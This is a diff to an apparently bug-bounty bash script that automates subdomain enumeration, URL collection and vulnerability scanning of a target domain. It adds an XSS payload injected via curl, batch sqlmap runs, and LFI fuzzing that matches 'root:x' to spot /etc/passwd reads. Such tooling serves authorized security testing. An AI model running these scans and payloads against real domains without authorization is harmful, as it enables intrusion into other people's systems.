@@ -12,11 +12,11 @@ echo -e "\n\e[00;35m#########################################################\e[
 sleep 2
 d=$(date +"%b-%d-%y %H:%M")
 
-echo -e "\n\e[00;34m################## Installation  Started On:  $d #####################\e[00m"
+echo -e "\n\e[00;34m################## Recon Automation  Started On:  $d #####################\e[00m"
 sleep 2
 domain=$1
 
-mkdir -p $domain $domain/domain_enum $domain/final_domains $domain/takeovers $domain/cors $domain/nuclei_scan $domain/waybackurls $domain/target_wordlist $domain/gf $domain/xss_scan $domain/openredirect
+mkdir -p $domain $domain/domain_enum $domain/final_domains $domain/takeovers $domain/vulnerabilities $domain/vulnerabilities/ref_xss $domain/vulnerabilities/xss_scan $domain/vulnerabilities/sqli $domain/vulnerabilities/cors  $domain/nuclei_scan $domain/waybackurls $domain/target_wordlist $domain/gf  $domain/vulnerabilities/LFI $domain/vulnerabilities/openredirect
 
 echo -e "\n\e[00;33m#################### Domain Enumeration Started ###########################\e[00m"
 sleep 2
@@ -66,23 +66,14 @@ subdomain_takeover
 sleep 2
 echo -e "\n\e[00;32m#############Checking For Cors misconfiguration#####################\e[00m"
 cors_misconfiguration(){
-python3 ~/tools/Corsy/corsy.py -i $domain/final_domains/httpx.txt -t 15 | tee $domain/cors/cors_misconfig.txt
+python3 ~/tools/Corsy/corsy.py -i $domain/final_domains/httpx.txt -t 15 | tee $domain/vulnerabilities/cors/cors_misconfig.txt
 }
 cors_misconfiguration
-sleep 2
-echo -e "\n\e[00;33m#############...Nuclei Scanner Started...#####################\e[00m"
-nuclei_scan(){
-cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/cves/ -c 50 -o $domain/nuclei_scan/cves.txt
-cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/vulnerabilities/ -c 50 -o $domain/nuclei_scan/vulnerabilities.txt
-cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/misconfiguration/ -c 50 -o $domain/nuclei_scan/misconfiguration.txt
-
-}
-nuclei_scan
 sleep 2
 echo -e "\n\e[00;34m#############...Collecting URLS ...#####################\e[00m"
 wayback_data(){
 
-cat $domain/domains.txt | waybackurls | tee $domain/waybackurls/tmp.txt
+cat $domain/domains.txt | gau | tee $domain/waybackurls/tmp.txt
 cat $domain/waybackurls/tmp.txt | egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpep|\.jpeg|\.css|\.ico|\jpg" | sed 's/:80//g;s/:443//g' | sort -u >> $domain/waybackurls/wayback.txt
 
 rm $domain/waybackurls/tmp.txt
@@ -124,19 +115,43 @@ gf idor $domain/waybackurls/valid.txt | tee $domain/gf/idor.txt
 }
 gf_patterns
 sleep 2
-echo -e "\n\e[00;31m###############Searching For Open Redirect | CRLF Injection ###########################\e[00m"
+echo -e "\n\e[00;32m###############Searching For Open Redirect  ###########################\e[00m"
 open_redirect(){
-python3 ~/tools/Oralyzer/oralyzer.py -l $domain/gf/redirect.txt -p ~/tools/Oralyzer/payloads.txt | tee $domain/openredirect/redirect.txt
-python3 ~/tools/Oralyzer/oralyzer.py -l $domain/gf/purered.txt  -crlf | tee $domain/openredirect/crlf.txt
+cat $domain/gf/redirect.txt | qsreplace FUZZ | tee $domain/vulnerabilities/openredirect/fuzzredirect.txt
+python3 ~/tools/OpenRedireX/openredirex.py -l $domain/vulnerabilities/openredirect/fuzzredirect.txt -p ~/tools/OpenRedireX/payloads.txt --keyword FUZZ | tee $domain/vulnerabilities/openredirect/confrimopenred.txt
 
 }
 open_redirect
 sleep 2
-echo -e "\n\e[00;31m##################XSS Scanner Started ###########################\e[00m"
+echo -e "\n\e[00;33m###############Searching For Reflected Params And XSS ###########################\e[00m"
+param_reflected(){
+python3 ~/tools/ParamSpider/paramspider.py --domain $domain/final_domains/httpx.txt --exclude png,svg,jpg -o $domain/ref_xss/paramspider.txt
+cat $domain/waybackurls/valid.txt | Gxss -p khan | dalfox pipe --mining-dict ~/tools/Arjun/arjun/db/params.txt --skip-bav -o $domain/vulnerabilities/ref_xss/xss.txt
+ 
+}
+param_reflected
+echo -e "\n\e[00;34m##################XSS Scanner Started ###########################\e[00m"
 xss_scanner(){
 
-cat $domain/gf/xss.txt | kxss | tee $domain/xss_scan/kxss1.txt
-cat $domain/gf/purexss.txt | kxss | tee $domain/xss_Scan/kxss2.txt
-dalfox file $domain/gf/xss.txt | tee $domain/xss_scan/dalfox.txt
+cat $domain/gf/xss.txt | kxss | tee $domain/vulnerabilities/xss_scan/kxss.txt
+cat $domain/gf/xss.txt | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $domain/vulnerabilities/xss_scan/vulnxss.txt
 }
 xss_scanner
+sleep 2
+echo -e "\n\e[00;33m#############...Nuclei Scanner Started...#####################\e[00m"
+nuclei_scan(){
+cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/cves/ -c 50 -o $domain/nuclei_scan/cves.txt
+cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/vulnerabilities/ -c 50 -o $domain/nuclei_scan/vulnerabilities.txt
+cat $domain/final_domains/httpx.txt | nuclei -t ~/tools/nuclei-templates/misconfiguration/ -c 50 -o $domain/nuclei_scan/misconfiguration.txt
+
+}
+nuclei_scan
+sleep 1
+echo -e "\n\e[00;35m#############...Searching For Sql Injection...#####################\e[00m"
+vuln_scan(){
+sqlmap -m $domain/gf/sql.txt --batch --random-agent --level 1 | tee $domain/vulnerabilities/sqli/sqlmap.txt
+sleep 1
+echo -e "\n\e[00;37m#############...Searching For LFI vulnerabilities...#####################\e[00m"
+cat $domain/gf/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/tools/lfipayloads.txt ; done | tee $domain/vulnerabilities/LFI/lfi.txt
+}
+vuln_scan
